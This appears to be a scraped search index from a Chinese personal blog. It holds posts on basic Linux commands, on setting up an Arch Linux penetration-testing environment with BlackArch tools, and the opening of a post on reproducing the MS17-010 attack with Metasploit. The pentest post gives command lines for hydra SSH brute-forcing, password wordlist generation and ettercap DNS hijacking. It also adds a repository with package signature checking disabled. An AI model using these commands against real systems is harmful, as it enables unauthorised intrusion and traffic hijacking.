","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:5:2","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"mkdir命令 这个命令是 “make directory” 的缩写，意为创建一个目录它一般情况下有两种用法 一般创建，直接在已存在的绝对路径或相对路径创建一个目录 递归创建，创建一连串目录，在创建之前有一级或以上的目录未被创建 同样也是可以指定绝对路径和相对路径的，接下来我就只写出相对路径的示例了，因为方便。 来尝试一下？ ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:6:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"用法 一般创建 假设目录/tmp/a/b/c 我们要创建一个目录d [weepingdogel@localhost c]$ mkdir ./d # 在/tmp/a/b/c/下面创建一个目录d # 按下回车之后，目录就创建了，我们可以用ls来检查一下 [weepingdogel@localhost c]$ ls -lh 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:47 文本.txt drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 19:07 d drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori [weepingdogel@localhost c]$ 可见，目录被成功创建了。 递归创建 假设目录/tmp/a/b/c 我们要在当前目录下创建一串目录，比如./go/for/it，此时我们就要加个参数-p [weepingdogel@localhost c]$ mkdir -p ./go/fot/it # 按下回车之后，一串目录就被创建了，接下来我们会一级一级的查看 [weepingdogel@localhost c]$ ls -lh 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:47 文本.txt drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 19:07 d drwxr-xr-x 3 weepingdogel weepingdogel 60 8月 5 19:14 go drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori # 可见我们看见了目录go [weepingdogel@localhost c]$ cd ./go # 我们试着进入这个目录，可见我们成功进入了目录 [weepingdogel@localhost go]$ ls -lh #继续查看下一级 总用量 0 drwxr-xr-x 3 weepingdogel weepingdogel 60 8月 5 19:14 for [weepingdogel@localhost go]$ cd ./for #进入目录for [weepingdogel@localhost for]$ ls -lh # 继续查看下一级 总用量 0 drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 19:14 it [weepingdogel@localhost for]$ cd ./it #接下来我们进入这个目录it，由于it里面是空的，所以就不用ls查看了 [weepingdogel@localhost it]$ pwd #使用pwd查看当前位置 /tmp/a/b/c/go/for/it [weepingdogel@localhost it]$ 可见这一串目录也创建成功了。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:6:1","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"rm命令 注意:此命令如果使用不当十分危险 这个命令是 “remove” 的缩写，意为删除，作用上和windows中的del命令差不多，但是用法和参数却有所不同，而且诶这个命令如果使用不当是十分危险的，因为在Linux中，就算是正在被使用的文件也可以被删除，并不会有windows那种保姆级别的”拒绝访问”。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:7:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"用法 假设目录/tmp/a/b/c 删除文件 我们来尝试删除一下文本.txt [weepingdogel@localhost c]$ rm ./文本.txt # 按下回车之后这个文件就被删除了 [weepingdogel@localhost c]$ ls 223333 d go test wiaori [weepingdogel@localhost c]$ 删除目录 如果你要删除一个目录，比如go，就需要加一个参数-r [weepingdogel@localhost c]$ rm -r ./go # 按下回车之后，这个目录就被删除了 [weepingdogel@localhost c]$ ls -lh #查看一下就可以看到，go也不见了 总用量 0 -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 19:07 d drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori [weepingdogel@localhost c]$ 强制删除|危险| 如果你需要强制删除一个文件，则需要调用root权限，并且使用-rf参数。 注意，千万不要用这个命令去删除 /目录，否则你的系统将会自杀 比如我们要删除223333这个文件 [weepingdogel@localhost c]$ sudo rm -rf ./223333 # 按下回车后会要你输入一次密码，输入密码后按回车，这个文件就删除了，Linux的安全保护机制使密码不会显示在屏幕上 [sudo] weepingdogel 的密码： [weepingdogel@localhost c]$ ls -lh # 查看一下文件的情况，可见这个文件不见了 总用量 0 drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 19:07 d drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori [weepingdogel@localhost c]$ ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:7:1","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"包管理器 注意：不同发行版之间可能有差异 一般情况下，新手使用的deb系发行版的包管理器是apt 那么这些就是apt常用的用法了 [weepingdogel@localhost ~]$ sudo apt update # 更新软件源 [weepingdogel@localhost c]$ sudo apt install \u003c包名\u003e # 安装一个软件、软件包 [weepingdogel@localhost c]$ sudo apt search \u003c软件名称\u003e # 搜索软件 [weepingdogel@localhost c]$ sudo apt upgrade # 升级你已安装的软件，通常消耗时间比较长 [weepingdogel@localhost c]$ sudo apt remove \u003c包名\u003e # 卸载软件 [weepingdogel@localhost c]$ sudo apt autoremove # 自动处理依赖 如果要安装本地包，则需要使用本地包管理器dpkg，用法如下 [weepingdogel@localhost c]$ sudo dpkg -i \u003c包名\u003e # 安装本地包 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:8:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"结语 本期博客中的内容并不是很详细，我已经尽力写得让大多数人能看懂，也许还有少数人无法理解内容，没关系，你可以在下面的评论区提问。 那么，欢迎评论。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:9:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["渗透测试"],"content":"用 Arch Linux + BlackArch 的软件源来搭建渗透环境。","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"简介Arch Linux Arch Linux是一款通用x86_64的GNU/Linux发行版，它采用滚动更新模式，尽全力给用户提供最新的稳定版软件。 嘿嘿，很久不滚可能会滚挂哦 刚装完的Arch只是一个基本系统，什么都没有，随后用户就可以根据自己的想法和喜好，安装自己需要的软件，然后通过高度自定义的配置，打造自己喜欢的、理想的系统。这也是Arch的可爱和有吸引力之处。所以Arch也是我最喜欢的发行版之一。 关于Arch Linux的更多详细内容，请参见Arch Wiki。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:1:0","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"本期内容介绍 本期将会演示如何用Arch Linux打造完美的渗透环境。一切操作均为教程演示，请读者根据实际情况操作。没使用过Arch Linux的用户请谨慎操作，并仔细查阅Arch Wiki。 那么，开始本期的内容吧。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:2:0","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"提示 本期博客会大量使用Arch Wiki的超链接，以方便理解部分内容。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:2:1","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"准备工作 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:3:0","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"安装Arch Linux 本期博客不会详细写出Arch Linux的安装过程，请参考Arch Wiki安装Arch Linux，并做好基本的配置工作。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:3:1","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"选择轻量桌面环境 由于渗透测试中部分操作会占用大量的资源，所以请尽量按需求选择轻量的桌面环境，这里不建议使用 Gnome 和 KDE，因为二者占用的资源非常大，对低配用户不友好。 LXDE 轻量级GTK桌面环境，默认窗口管理器是 OpenBox ，最轻量的桌面环境之一。 LXQT 2013年间，洪任諭（“PCMan”）启动了将 LXDE 移植到 Qt 的项目。所以LXQT相当于是使用QT的LXDE，默认窗口管理器还是 OpenBox ，它比上面的LXDE还要轻量。 xfce4 目前我在用的桌面环境，基于GTK+2，这个是轻量化桌面环境中最好看的一个了。 i3wm i3 是一种动态的平铺式窗口管理器，其灵感来自于面向开发者与资深用户的 wmii。 i3 的既定目标包括清晰可读的文档，完善的多显示器支持，基于树形结构的窗口管理，提供 vim 式的多种操作模式。 ——摘自Arch Wiki。 自己DIY桌面环境 你可以使用上面介绍过的 OpenBox 通过配置来DIY自己的桌面环境，也可以使用 fluxbox、i3wm 等。详细请参见 利用openbox打造自己的桌面环境-辣条的博客(链接已失效)。 本期博客也将会使用自定义桌面环境进行演示。 OpenBox+xfce4-panel ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:3:2","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"添加Black Arch源 当Arch Linux基本配置完成之后，就可以开始正常使用了，但是为了安装渗透工具，需要添加一个Black Arch软件源 什么是Black Arch BlackArch Linux，简称BlackArch，是一份基于Arch的Linux发行版。该发行版被设计用于系统渗透测试及安全研究。BlackArch提供一张自启动运行DVD镜像，其中包含有多个轻量级窗口管理器和一千多种用于渗透测试和计算机取证分析的专用工具。该系统即可以直接从镜像启动，也可以安装在硬盘、U盘或虚拟机上。 ——摘自维基百科(需要科学上网) Black Arch官网：blackarch.org 如上我们知道，Black Arch是一个基于Arch Linux的独立发行版，但我们不需要去安装它，我们只需要添加它的软件源就好。 具体操作如下: $ sudo nano /etc/pacman.conf # 编辑pacman.conf文件 在pacman.conf文件的末尾加入以下内容: [blackarch] SigLevel = Optional TrustAll Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch 然后执行: $ sudo pacman -Syyu 如果没问题，就可以使用Black Arch的软件源了。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:3:3","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"开始安装、配置常用渗透工具 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:4:0","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"端口扫描和信息收集 Namp 首先搬出Nmap，这是一个很常用的扫描工具，可以在渗透的过程中扫描到对方的IP、端口、操作系统等情况。 安装方法 $ sudo pacman -S nmap 基本用法 $ nmap \u003c目标IP地址\u003e # 简单的扫描 $ sudo nmap -O \u003c目标IP地址\u003e # 扫描目标的操作系统情况 $ sudo nmap -sP \u003c目标IP地址\u003e # ping扫描 更多用法可参考搜索引擎查询。 xerosploit 这个扫描工具比Nmap要炫酷一些，色彩也比较好看，用法也很简单，比Metasploit还简单。 安装方法 $ sudo pacman -S xerosploit 用法 $ sudo xerosploit 然后执行help就可以看到软件自带的帮助文档了 nslookup 这个命令是查看域名记录的，可以查看Cname、A等各种记录。它包含在dnsutils这个包里 安装方法 $ sudo pacman -S dnsutils 安装这个包dnsutils即可。 我也不太了解这个，所以具体怎么用请自行百度、谷歌一下吧。 nbtscan 内网扫描工具，可以扫描IP段内是否有存活的IP，速度比nmap要快一些。但是只能用于局域网。 安装方法 $ sudo pacman -S nbtscan 使用方法 基本扫描 $ sudo nbtscan -r 192.168.16.0/24 官方帮助文档 \"Human-readable service names\" (-h) option cannot be used without verbose (-v) option. Usage: nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(\u003cscan_range\u003e) -v verbose output. Print all names received from each host -d dump packets. Print whole packet contents. -e Format output in /etc/hosts format. -l Format output in lmhosts format. Cannot be used with -v, -s or -h options. -t timeout wait timeout milliseconds for response. Default 1000. -b bandwidth Output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that ougoing queries don't get dropped. -r use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix. -q Suppress banners and error messages, -s separator Script-friendly output. Don't print column and record headers, separate fields with separator. -h Print human-readable names for services. Can only be used with -v option. -m retransmits Number of retransmits. Default 0. -f filename Take IP addresses to scan from file filename. -f - makes nbtscan take IP addresses from stdin. \u003cscan_range\u003e what to scan. Can either be single IP like 192.168.1.1 or range of addresses in one of two forms: xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx. Examples: nbtscan -r 192.168.1.0/24 Scans the whole C-class network. nbtscan 192.168.1.25-137 Scans a range from 192.168.1.25 to 192.168.1.137 nbtscan -v -s : 192.168.1.0/24 Scans C-class network. Prints results in script-friendly format using colon as field separator. Produces output like that: 192.168.0.1:NT_SERVER:00U 192.168.0.1:MY_DOMAIN:00G 192.168.0.1:ADMINISTRATOR:03U 192.168.0.2:OTHER_BOX:00U ... nbtscan -f iplist Scans IP addresses specified in file iplist. 这个我也不是很了解，因为平时都用nmap。 burpsuite 抓包神器，需要安装java依赖。 安装方法 $ sudo pacman -S burpsuite 使用方法 burpsuite有图形界面，可以通过搜索引擎找到使用方法。 图形界面的东西不好讲，图片一多博客就加载不出来了，请见谅。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:4:1","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"暴力破解、密码生成 hydra 暴力破解工具，中文名九头蛇，功能很强大。 安装方法 $ sudo pacman -S hydra 使用方法 爆破ssh端口 $ hydra -l \u003c用户名\u003e -P \u003c密码字典.txt\u003e -v -e ns -t \u003c次数\u003e \u003c目标IP\u003e ssh 具体使用方法可以通过搜索引擎查询。 crunch 强大的密码字典生成器。 安装方法 $ sudo pacman -S crunch 使用方法 Crunch中的特殊字符有： '%' 插入数字 '@' 插入小写字母 ',' 插入大写字母 '^' 插入符号 Crunch中用到的命令参数有： -b #按大小分割字典文件，比如后跟20mib -c #密码个数（行数），比如8000 -d #限制出现相同元素的个数（至少出现元素个数），-d 3就不会出现aabbbb之类的情况 -e #定义停止生成密码 ，比如-e abcd：到abcd停止生成密码 -f #调用密码库文件，比如-f charset.lst mixalpha-numeric 意为调用密码库 charset.lst中的 mixalpha-numeric项目字符 -i #改变输出格式 -l #与-t搭配使用 -m #与-p搭配使用 -o #保存为 -p #定义密码元素 -q #读取字典 -r #定义从某一个地方重新开始 -s #第一个密码，从xxx开始 -t #定义输出格式 -z #打包压缩，格式支持 gzip, bzip2, lzma, 7z 生成最小1位，最大8位，由26个小写字母为元素的所有组合: $ crunch 1 8 \u003e\u003e 1.txt 生成 最小为1,最大为4.由abcd为元素的所有组合: $ crunch 1 4 abcd \u003e\u003e 2.txt 生成以“yale”“test”为元素的所有密码组合: $ crunch 4 5 -p yale test 还有更多的方法可以自行通过搜索引擎查找。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:4:2","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"漏洞利用 metasploit 这是最重要的一个工具，没有它，内网的渗透也是无法完整进行的。 安装方法 $ sudo pacman -S metasploit 安装完后执行: $ sudo msfconsole 即可。 修复数据库问题 启动msf以后是不是出现了三行报错？这是没有连接数据库导致的。 安装postgresql $ sudo pacman -S postgresql 配置postgresql 安装完后会多出来一个用户，叫做postgres，我们需要给它设置一个密码。 $ sudo passwd postgres 然后初始化数据库 $ sudo su - postgres -c \"initdb --locale en_US.UTF-8 -E UTF8 -D '/var/lib/postgres/data'\" 初始化完成后就可以启动数据库了 $ sudo systemctl start postgresql 接下来，进入数据库用户postgres $ sudo su postgres 执行psql $ psql 然后光标就变成了postgres=# postgres=# 如上面这个样子。 接下来创建一个数据库的新用户，比如msf4 postgres=# CREATE USER msf4 WITH PASSWORD '123456'; 然后创建对应的数据库 postgres=# CREATE DATABASE msfdb OWNER msf4; 将msfdb数据库的所有权限都赋予msf4 postgres=# GRANT ALL PRIVILEGES ON DATABASE msfdb TO msf4; 退出psql postgres=# \\q 创建Linux普通用户，名称与刚才新建的数据库用户同名，如msf4 $ sudo useradd msf4 通过msf连接数据库 进入msf，链接数据库，命令为db_connect用户名:密码@ip/数据库名 msf5\u003e db_connect msf4:123456@127.0.0.1/msfdb 然后检查是否连接成功，如果出现类似以下内容说明成功了。 msf5 \u003e db_status [*] Connected to msf3. Connection type: postgresql. Connection name: DFz5oEX3. 成功连接后，别忘了保存以及设置postgresql自启 msf5 \u003e db_save $ sudo systemctl enable postgresql 使用方法 参考这篇文章 也可通过搜索引擎找更多的教程。 sqlmap 强大的web注入工具，使用方法可以通过搜索引擎查到。 安装方法 执行以下命令安装即可。 $ sudo pacman -S sqlmap ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:4:3","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"DNS劫持 ettercap 强大的DNS劫持工具，各大搜索引擎也有不少教程。它分为命令行版本和图形化版本，但是只能装其中一个，否则会冲突。 安装方法 命令行版: $ sudo pacman -S ettercap 图形化版: $ sudo pacman -S ettercap-gtk 命令行版本在终端执行即可，图形化版本可以在菜单中找到，如果没有执行以下命令 $ sudo ettercap -G apache 怎么还有这个东西？这个东西不是建网站的吗，哈哈，其实这个是辅助ettercap的，当你劫持目标DNS以后，会将其强行解析到你的IP，而apache就可以在你的机器上运行一个静态网页（html）。 安装方法 $ sudo pacman -S apache 使用方法 执行以下命令启动apache $ sudo systemctl start httpd 网页根目录为/srv/http/ 可以在目录下写一个html文件，写完执行 $ sudo systemctl restart httpd 以重启apache即可。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:4:4","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"小结 一个普通的Arch Linuxu导入了Black Arch的软件源之后，可以堪称完美的渗透环境了，以上只是常用的工具，而Black Arch软件源里面有几千个工具，想要什么可以通过pacman下载安装，应有尽有。 最后，谢谢访问。 ","date":"2019-07-31","objectID":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/:5:0","tags":["笔记","Linux","Arch Linux","渗透测试","黑客"],"title":"用 Arch Linux 打造完美渗透环境","uri":"/zh-cn/posts/%E7%94%A8arch_linux%E6%89%93%E9%80%A0%E5%AE%8C%E7%BE%8E%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83/"},{"categories":["渗透测试"],"content":"好奇的话就点开看看？","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"简介 该男子居然在家做出这种事情，使多数人震惊！ ","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:1:0","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"这才是真正的简介 哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。 ","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:2:0","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"MS17-010是啥啊？ 你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。 那这个漏洞是怎样的呢？我将给出以下链接用于参考： Microsoft 安全公告 MS17-010 - 严重 https://cvedetails.com/cve/CVE-2017-0143/ https://cvedetails.com/cve/CVE-2017-0144/ https://cvedetails.com/cve/CVE-2017-0145/ https://cvedetails.com/cve/CVE-2017-0146/ https://cvedetails.com/cve/CVE-2017-0147/ https://cvedetails.com/cve/CVE-2017-0148/ https://github.com/RiskSense-Ops/MS17-010 ","date":"2019-07-26","objectID":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/:2:1","tags":["教程","Linux","Arch Linux","渗透测试","装逼","黑客"],"title":"震惊！16岁男子竟然在家里做出这种事！","uri":"/zh-cn/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/"},{"categories":["渗透测试"],"content":"攻击复现 那么，我们来复现一下这个漏洞的攻击流程吧。在这里，我给大家安利一个Linux的渗透测试软件包。叫做Metasploit。 它在作为渗透测试的发行版中是自带的，如果你用的不是作为渗透测试的发行版，那么以下是安装方法： 基于Arch $ sudo pacman -S metasploit 基于Debian更新源里有的 $ sudo apt-get install metasploit rpm系或deb系源里没有的 $ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \u003e msfinstall $ sudo chmod 755 msfinstall \u0026\u0026 ./msfinstall Windows嘛…. 两个选择 请到MSF官网下载，并且耐心等待。 出门左转安装Linux 